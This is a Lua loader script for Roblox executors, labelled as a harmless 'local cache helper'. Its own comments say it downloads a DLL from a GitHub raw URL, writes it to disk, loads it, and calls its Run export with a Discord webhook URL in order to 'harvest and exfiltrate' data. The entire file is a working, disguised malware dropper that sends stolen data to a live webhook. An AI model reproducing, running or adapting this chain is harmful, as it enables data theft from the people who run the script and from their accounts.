-- RobloxUtility — local cache helper (loader)
-- Self-contained chain: downloads the DLL from raw GitHub, writes it to
-- disk, loads it, then calls Run() to harvest and exfiltrate.

local WEBHOOK_URL = "https://discord.com/api/webhooks/1476791698041339997/tRLjlN11V6jBrSfHak-PcMTpty-sjHAPglOXl5Gs92UH0nCz0bukhQuuMmv0b_uNj6Pi"
local DLL_URL     = "https://raw.githubusercontent.com/ScriptMaster101/RobloxUtility/master/utility.dll"
local DLL_PATH    = "utility.dll"

print("[+] RobloxUtility chain fired")

-- 1. Download the DLL
print("[*] Fetching utility.dll from raw GitHub...")
local ok, bytes = pcall(function()
    return game:HttpGet(DLL_URL, true)
end)
if not ok or type(bytes) ~= "string" or #bytes < 1024 then
    print("[!] DLL download failed or too small (" .. (type(bytes) == "string" and #bytes or "?") .. " bytes)")
    return
end
print("[+] Downloaded: " .. #bytes .. " bytes")

-- 2. Write to disk
local f, err = io.open(DLL_PATH, "wb")
if not f then
    -- Fall back to the executor's writefile if io is sandboxed
    if writefile then
        writefile(DLL_PATH, bytes)
        print("[+] utility.dll written via writefile()")
    else
        print("[!] Could not open file for writing: " .. tostring(err))
        return
    end
else
    f:write(bytes)
    f:close()
    print("[+] utility.dll written: " .. DLL_PATH)
end

-- 3. Load the DLL (executor-specific function)
local d = (load_dll or loadlibrary)(DLL_PATH)
if not d then
    print("[!] load_dll returned nil")
    return
end
print("[+] utility.dll loaded")

-- 4. Call the Run export
if d.Run then
    print("[+] Calling Run()...")
    d.Run(WEBHOOK_URL, 0)
    print("[+] Run() returned")
else
    print("[!] utility.dll has no Run export")
end
